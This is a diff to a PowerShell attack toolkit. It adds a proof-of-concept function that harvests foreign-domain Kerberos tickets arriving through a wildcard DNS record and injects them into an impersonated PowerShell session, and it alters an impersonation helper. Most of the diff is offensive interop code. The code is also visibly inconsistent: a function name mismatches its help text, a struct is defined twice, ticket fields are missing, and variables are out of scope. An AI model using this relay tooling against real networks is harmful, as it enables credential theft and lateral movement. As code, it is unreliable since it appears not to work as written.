@@ -670,6 +670,510 @@ function Add-RemoteMachineAccount {
 
 <#
 .SYNOPSIS
+Performs pass-the-ticket attacks through automatic harvesting. This function is an alternative to the [krbrelayx](https://github.com/dirkjanm/krbrelayx) tool when you're already running a DC.
+
+.DESCRIPTION
+Uses internal Windows APIs to listen for incoming TGTs from a foreign domain. If found, it uses low-level Windows APIs to inject them into a logon-type-9 PowerShell process.
+This allows for relaying Kerberos tickets without needing to create a new machine account or establish a trust relationship, as long as the target domain's users authenticate to the wildcard DNS record.
+
+.PARAMETER TargetDC
+The hostname or FQDN of the remote domain controller to relay tickets to.
+.PARAMETER LocalIP
+The IP address that the wildcard DNS record points to, which should be the local machine running this
+function.
+.PARAMETER Credential
+PSCredential object containing credentials for authentication to the target domain.
+Used with the PasswordAuth parameter set.
+.PARAMETER PTT
+Indicates Pass-The-Ticket authentication should be used instead of password authentication.
+.EXAMPLE
+$cred = Get-Credential
+Invoke-WildcardDnsKrbRelay -TargetDC "dc01.target.example.com" -LocalIP "192.168.1.100" -Credential $cred
+Relays tickets to dc01.target.example.com using password-based authentication.
+
+.EXAMPLE
+Invoke-WildcardDnsKrbRelay -TargetDC "dc01.target.example.com" -LocalIP "192.168.1.100" -PTT
+Relays tickets to dc01.target.example.com using Pass-The-Ticket authentication.
+
+.NOTES
+Requires a wildcard DNS record pointing to the local machine, created with `Add-RemoteDnsWildcardRecord`.
+Requires appropriate permissions to inject tickets and create logon sessions on the local machine.
+This function is a proof-of-concept and may require additional error handling and edge case management for production use.
+#>
+function Invoke-DnsKrbRelay {
+    [CmdletBinding(DefaultParameterSetName="PasswordAuth")]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$TargetDC,
+        [Parameter(Mandatory=$true)]
+        [string]$LocalIP,
+        [Parameter(ParameterSetName="PasswordAuth", Mandatory=$true)]
+        [System.Management.Automation.PSCredential]$Credential,
+        [Parameter(ParameterSetName="PassTheTicket")]
+        [switch]$PTT
+    )
+    
+    $TargetDomain = if ($PTT) {
+        (Get-ADDomain -Server $TargetDC).DNSRoot
+    } else {
+        (Get-ADDomain -Server $TargetDC -Credential $Credential).DNSRoot
+    }
+
+    $signature = @"
+using System;
+using System.Runtime.InteropServices;
+
+namespace KerberosAuth {
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct UNICODE_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+
+    public enum KERB_LOGON_SUBMIT_TYPE : int {
+        KerbInteractiveLogon = 2,
+        KerbSmartCardLogon = 6,
+        KerbWorkstationUnlockLogon = 7,
+        KerbSmartCardUnlockLogon = 8,
+        KerbProxyLogon = 9,
+        KerbTicketLogon = 10,
+        KerbTicketUnlockLogon = 11,
+        KerbS4ULogon = 12, // Service for User
+        KerbCertificateLogon = 13,
+        KerbCertificateS4ULogon = 14,
+        KerbCertificateUnlockLogon = 15,
+        KerbNoElevationLogon = 83,
+        KerbLuidLogon = 84
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_INTERACTIVE_LOGON {
+        public KERB_LOGON_SUBMIT_TYPE MessageType;
+        public UNICODE_STRING LogonDomainName;
+        public UNICODE_STRING UserName;
+        public UNICODE_STRING Password;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_TICKET_LOGON {
+        public KERB_LOGON_SUBMIT_TYPE MessageType;
+        public uint Flags;
+        public uint ServiceTicketLength;
+        public uint TicketGrantingTicketLength;
+        public IntPtr ServiceTicket;
+        public IntPtr TicketGrantingTicket;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_CRYPTO_KEY {
+        public uint KeyType;
+        public uint Length;
+        public IntPtr Value;
+    }
+    
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_EXTERNAL_TICKET
+    {
+        public IntPtr ServiceName; // PKERB_EXTERNAL_NAME
+        public IntPtr TargetName;  // PKERB_EXTERNAL_NAME
+        public IntPtr ClientName;  // PKERB_EXTERNAL_NAME
+        public UNICODE_STRING DomainName;
+        public UNICODE_STRING TargetDomainName;
+        public UNICODE_STRING AltTargetDomainName;
+        public KERB_CRYPTO_KEY SessionKey;
+        public uint TicketFlags;
+        public uint Flags;
+        public long KeyExpirationTime; // LARGE_INTEGER
+        public long StartTime;         // LARGE_INTEGER
+        public long EndTime;           // LARGE_INTEGER
+        public long RenewUntil;        // LARGE_INTEGER
+        public long TimeSkew;          // LARGE_INTEGER
+        public uint EncodedTicketSize;
+        public IntPtr EncodedTicket;   // PUCHAR
+    }
+
+    public enum KERB_PROFILE_BUFFER_TYPE : int {
+        KerbInteractiveProfile = 2,
+        KerbSmartCardProfile = 4,
+        KerbTicketProfile = 6
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_INTERACTIVE_PROFILE {
+        public KERB_PROFILE_BUFFER_TYPE MessageType;
+        public ushort LogonCount;
+        public ushort BadPasswordCount;
+        public long LogonTime;
+        public long LogoffTime;
+        public long KickOffTime;
+        public long PasswordLastSet;
+        public long PasswordCanChange;
+        public long PasswordMustChange;
+        public UNICODE_STRING LogonScript;
+        public UNICODE_STRING HomeDirectory;
+        public UNICODE_STRING FullName;
+        public UNICODE_STRING ProfilePath;
+        public UNICODE_STRING HomeDirectoryDrive;
+        public UNICODE_STRING LogonServer;
+        public uint UserFlags;
+    }
+
+    public enum KERB_PROTOCOL_MESSAGE_TYPE : int {
+        KerbDebugRequestMessage = 0,
+        KerbQueryTicketCacheMessage = 1,
+        KerbChangeMachinePasswordMessage = 2,
+        KerbVerifyPacMessage = 3,
+        KerbRetrieveTicketMessage = 4,
+        KerbUpdateAddressesMessage = 5,
+        KerbPurgeTicketCacheMessage = 6,
+        KerbChangePasswordMessage = 7,
+        KerbRetrieveEncodedTicketMessage = 8,
+        KerbDecryptDataMessage = 9,
+        KerbAddBindingCacheEntryMessage = 10,
+        KerbSetPasswordMessage = 11,
+        KerbSetPasswordExMessage = 12,
+        KerbVerifyCredentialsMessage = 13,
+        KerbQueryTicketCacheExMessage = 14,
+        KerbPurgeTicketCacheExMessage = 15,
+        KerbRefreshSmartcardCredentialsMessage = 16,
+        KerbAddExtraCredentialsMessage = 17,
+        KerbQuerySupplementalCredentialsMessage = 18,
+        KerbTransferCredentialsMessage = 19,
+        KerbQueryTicketCacheEx2Message = 20,
+        KerbSubmitTicketMessage = 21,
+        KerbAddExtraCredentialsExMessage = 22,
+        KerbQueryKdcProxyCacheMessage = 23,
+        KerbPurgeKdcProxyCacheMessage = 24,
+        KerbQueryTicketCacheEx3Message = 25,
+        KerbCleanupMachinePkinitCredsMessage = 26,
+        KerbAddBindingCacheEntryExMessage = 27,
+        KerbQueryBindingCacheMessage = 28,
+        KerbPurgeBindingCacheMessage = 29,
+        KerbPinKdcMessage = 30,
+        KerbUnpinAllKdcsMessage = 31,
+        KerbQueryDomainExtendedPoliciesMessage = 32,
+        KerbQueryS4U2ProxyCacheMessage = 33,
+        KerbRetrieveKeyTabMessage = 34,
+        KerbRefreshPolicyMessage = 35,
+        KerbPrintCloudKerberosDebugMessage = 36,
+        KerbNetworkTicketLogonMessage = 37,
+        KerbNlChangeMachinePasswordMessage = 38
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct KERB_ADD_BINDING_CACHE_ENTRY_EX_REQUEST {
+        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
+        public UNICODE_STRING RealmName;
+        public UNICODE_STRING KdcAddress;
+        public ulong AddressType;
+        public ulong DcFlags;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID
+    {
+        public uint LowPart;
+        public int HighPart;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_ADD_CREDENTIALS_REQUEST
+    {
+        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
+        public UNICODE_STRING UserName;
+        public UNICODE_STRING DomainName;
+        public UNICODE_STRING Password;
+        public LUID LogonId;
+        public uint Flags;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_INTERACTIVE_PROFILE {
+        public KERB_PROFILE_BUFFER_TYPE MessageType;
+        public ushort LogonCount;
+        public ushort BadPasswordCount;
+        public long LogonTime;
+        public long LogoffTime;
+        public long KickOffTime;
+        public long PasswordLastSet;
+        public long PasswordCanChange;
+        public long PasswordMustChange;
+        public UNICODE_STRING LogonScript;
+        public UNICODE_STRING HomeDirectory;
+        public UNICODE_STRING FullName;
+        public UNICODE_STRING ProfilePath;
+        public UNICODE_STRING HomeDirectoryDrive;
+        public UNICODE_STRING LogonServer;
+        public uint UserFlags;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_TICKET_PROFILE {
+        public KERB_INTERACTIVE_PROFILE Profile;
+        public KERB_CRYPTO_KEY SessionKey;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_TICKET_UNLOCK_LOGON {
+        public KERB_TICKET_LOGON Logon;
+        public LUID LogonId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_S4U_LOGON {
+        public KERB_LOGON_SUBMIT_TYPE MessageType;
+        public ulong flags;
+        public UNICODE_STRING ClientUpn;
+        public UNICODE_STRING ClientRealm;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_QUERY_TKT_CACHE_REQUEST {
+        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
+        public LUID LogonId;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_TICKET_CACHE_INFO {
+        public UNICODE_STRING ServerName;
+        public UNICODE_STRING RealmName;
+        public long StartTime;
+        public long EndTime;
+        public long RenewTime;
+        public uint EncryptionType;
+        public uint TicketFlags;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct KERB_QUERY_TKT_CACHE_RESPONSE {
+        public KERB_PROTOCOL_MESSAGE_TYPE MessageType;
+        public uint TicketCount;
+
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+        public KERB_TICKET_CACHE_INFO[] Tickets;
+    }
+
+    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref UNICODE_STRING PackageName, out uint AuthenticationPackage);
+
+    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern int LsaCallAuthenticationPackage(
+        IntPtr LsaHandle,
+        uint AuthenticationPackage,
+        IntPtr ProtocolSubmitBuffer,
+        uint SubmitBufferLength,
+        out IntPtr ProtocolReturnBuffer,
+        out uint ReturnBufferLength,
+        out int ProtocolStatus
+    );
+
+    public enum SECURITY_LOGON_TYPE : int {
+        Interactive = 2,
+        Network = 3,
+        Batch = 4,
+        Service = 5,
+        Proxy = 6,
+        Unlock = 7,
+        NetworkCleartext = 8,
+        NewCredentials = 9,
+        RemoteInteractive = 10,
+        CachedInteractive = 11,
+        CachedRemoteInteractive = 12,
+        CachedUnlock = 13
+    }
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct TOKEN_SOURCE {
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
+        public char[] SourceName;
+        public LUID SourceIdentifier;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct QUOTA_LIMITS {
+        public uint PagedPoolLimit;
+        public uint NonPagedPoolLimit;
+        public uint MinimumWorkingSetSize;
+        public uint MaximumWorkingSetSize;
+        public uint PagefileLimit;
+        public long TimeLimit;
+    }
+
+    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern int LsaLogonUser(
+        IntPtr LsaHandle,
+        ref UNICODE_STRING OriginName,
+        SECURITY_LOGON_TYPE LogonType,
+        uint AuthenticationPackage,
+        IntPtr AuthenticationInformation,
+        uint AuthenticationInformationLength,
+        IntPtr LocalGroups,
+        ref TOKEN_SOURCE SourceContext,
+        out IntPtr ProfileBuffer,
+        out uint ProfileBufferLength,
+        out LUID LogonId,
+        out IntPtr Token,
+        out QUOTA_LIMITS Quotas,
+        out int SubStatus
+    );
+}
+"@
+    $krbStructs = Add-Type -TypeDefinition $signature -Namespace KerberosAuth -PassThru
+
+    # 1. Use LsaConnectUntrusted to get a handle to the LSA
+    $lsaHandle = [IntPtr]::Zero
+    $result = [KerberosAuth]::LsaConnectUntrusted([ref]$lsaHandle)
+    if ($result -ne 0) {
+        Write-Error "LsaConnectUntrusted failed with error code: $result"
+        return
+    }
+
+    # 2. Use LsaLookupAuthenticationPackage to get the package ID for Kerberos
+    $kerberosPackageName = New-Object KerberosAuth.UNICODE_STRING
+    $kerberosPackageName.Buffer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("Kerberos")
+    $kerberosPackageName.Length = [System.Text.Encoding]::Unicode.GetByteCount("Kerberos")
+    $kerberosPackageName.MaximumLength = $kerberosPackageName.Length + [System.Text.Encoding]::Unicode.GetByteCount([char]0)
+
+    $kerberosPackageId = 0
+    $result = [KerberosAuth]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$kerberosPackageName, [ref]$kerberosPackageId)
+    if ($result -ne 0) {
+        Write-Error "LsaLookupAuthenticationPackage failed with error code: $result"
+        return
+    }
+
+    # 3. Listen for incoming TGTs. If found, use `Invoke-PSNetOnly` to create a new logon session with the ticket
+    while ($true) {
+        # 1. Use LsaCallAuthenticationPackage to initialize a KERB_QUERY_TKT_CACHE_REQUEST
+        $queryRequest = New-Object KerberosAuth.KERB_QUERY_TKT_CACHE_REQUEST
+        $queryRequest.MessageType = [KerberosAuth.KERB_PROTOCOL_MESSAGE_TYPE]::KerbQueryTicketCacheMessage
+        $queryRequest.LogonId = 0 # Query the current session
+        $queryRequestSize = [System.Runtime.InteropServices.Marshal]::SizeOf($queryRequest)
+        $queryRequestPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($queryRequestSize)
+        [System.Runtime.InteropServices.Marshal]::StructureToPtr($queryRequest, $queryRequestPtr, $false)
+
+        $responsePtr = [IntPtr]::Zero
+        $responseSize = 0
+        $protocolStatus = 0
+        $result = [KerberosAuth]::LsaCallAuthenticationPackage(
+            $lsaHandle,
+            $kerberosPackageId,
+            $queryRequestPtr,
+            [uint32]$queryRequestSize,
+            [ref]$responsePtr,
+            [ref]$responseSize,
+            [ref]$protocolStatus
+        )
+        
+        # Free the pointer only after everything else is done, which is when we've actually injected the ticket into a new session, not until then
+        if ($result -ne 0) {
+            Write-Error "LsaCallAuthenticationPackage failed with error code: $result"
+            continue
+        }
+
+        if ($protocolStatus -ne 0) {
+            Write-Error "Kerberos query failed with protocol status: $protocolStatus"
+            continue
+        }
+
+        # 2. If the response contains a ticket for the target domain, create a new logon session with the ticket
+        $response = [System.Runtime.InteropServices.Marshal]::PtrToStructure($responsePtr, [Type][KerberosAuth.KERB_QUERY_TKT_CACHE_RESPONSE])
+        if ($response.TicketCount -gt 0) {
+            foreach ($ticket in $response.Tickets) {
+                if ($ticket.ServerName.Buffer -like "*$TargetDomain*") {
+                    Write-Host "Found ticket for $($ticket.ServerName.Buffer) in domain $($ticket.RealmName.Buffer)" -ForegroundColor Green
+
+                    # Reuse some code from `Invoke-PSNetOnly` to launch a new PowerShell process with the impersonated token
+                    $block = {
+                        param(
+                            [string]$Signature
+                        )
+
+                        # Use LsaLogonUser to create a new logon session with logon type 9 and KERB_TICKET_LOGON
+                        $TicketLogon = New-Object KerberosAuth.KERB_TICKET_LOGON
+
+                        Add-Type -TypeDefinition $signature -Namespace KerberosAuth
+
+                        $TicketLogon.MessageType = [KerberosAuth.KERB_LOGON_SUBMIT_TYPE]::KerbTicketLogon
+                        $TicketLogon.ServiceTicketLength = $ticket.EncodedTicketSize
+                        $TicketLogon.ServiceTicket = $ticket.EncodedTicket
+                        $TicketLogon.TicketGrantingTicketLength = 0
+                        $TicketLogon.TicketGrantingTicket = [IntPtr]::Zero
+                        $ticketLogonSize = [System.Runtime.InteropServices.Marshal]::SizeOf($TicketLogon)
+                        $ticketLogonPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ticketLogonSize)
+                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TicketLogon, $ticketLogonPtr, $false)
+                        $originName = New-Object KerberosAuth.UNICODE_STRING
+                        $originName.Buffer = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("WildcardDnsKrbRelay")
+                        $originName.Length = [System.Text.Encoding]::Unicode.GetByteCount("WildcardDnsKrbRelay")
+                        $originName.MaximumLength = $originName.Length + [System.Text.Encoding]::Unicode.GetByteCount([char]0)
+                        $token = [IntPtr]::Zero
+                        $profileBuffer = [IntPtr]::Zero
+                        $profileBufferLength = 0
+                        $logonId = New-Object KerberosAuth.LUID
+                        $quotas = New-Object KerberosAuth.QUOTA_LIMITS
+                        $subStatus = 0
+
+                        $result = [KerberosAuth]::LsaLogonUser(
+                            $lsaHandle,
+                            [ref]$originName,
+                            [KerberosAuth.SECURITY_LOGON_TYPE]::NewCredentials,
+                            $kerberosPackageId,
+                            $ticketLogonPtr,
+                            [uint32]$ticketLogonSize,
+                            [IntPtr]::Zero,
+                            [ref](New-Object KerberosAuth.TOKEN_SOURCE),
+                            [ref]$profileBuffer,
+                            [ref]$profileBufferLength,
+                            [ref]$logonId,
+                            [ref]$token,
+                            [ref]$quotas,
+                            [ref]$subStatus
+                        )
+
+                        if ($result -ne 0) {
+                            Write-Error "LsaLogonUser failed with error code: $result"
+                            continue
+                        }
+
+                        if ($subStatus -ne 0) {
+                            Write-Error "LsaLogonUser failed with sub status: $subStatus"
+                            continue
+                        }
+                        
+                        Write-Host "Successfully logged on with ticket, token handle: $token. Attempting to launch new PowerShell process with impersonated token..." -ForegroundColor Green
+
+                        $advapi32 = Add-Type -MemberDefinition $TypeDefinition -Name "Win32Logon" -Namespace "Win32" -PassThru
+
+                        $identity = New-Object System.Security.Principal.WindowsIdentity($token)
+                        $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
+
+                        [System.Threading.Thread]::CurrentPrincipal = $principal
+                        [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, {
+                            Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass"
+                        })
+
+                        $advapi32::CloseHandle($Token)
+                    }
+
+                    Start-Job -ScriptBlock $block -ArgumentList "-Signature $signature"
+                }
+            }
+        }
+
+        # Wait 5 seconds before querying again to avoid high CPU usage
+        Start-Sleep -Seconds 5
+
+        # Free the response buffer after processing
+        if ($responsePtr -ne [IntPtr]::Zero) {
+            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($responsePtr)
+        }
+    }
+}
+
+<#
+.SYNOPSIS
 Impersonates a user and launches a new PowerShell process with their credentials.
 
 .DESCRIPTION
@@ -716,8 +1220,7 @@ public static extern bool CloseHandle(IntPtr hObject);
 
     $block = {
         param(
-            [IntPtr]$Token,
-            [string]$TypeDefinition
+            [IntPtr]$Token
         )
         $advapi32 = Add-Type -MemberDefinition $TypeDefinition -Name "Win32Logon" -Namespace "Win32" -PassThru
 
@@ -733,7 +1236,7 @@ public static extern bool CloseHandle(IntPtr hObject);
     }
 
     if ($success) {
-        Start-Job -ScriptBlock $block -ArgumentList "-Token $token -TypeDefinition $signature"
+        Start-Job -ScriptBlock $block -ArgumentList "-Token $token"
     } else {
         Write-Error "LogonUser failed with error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
     }
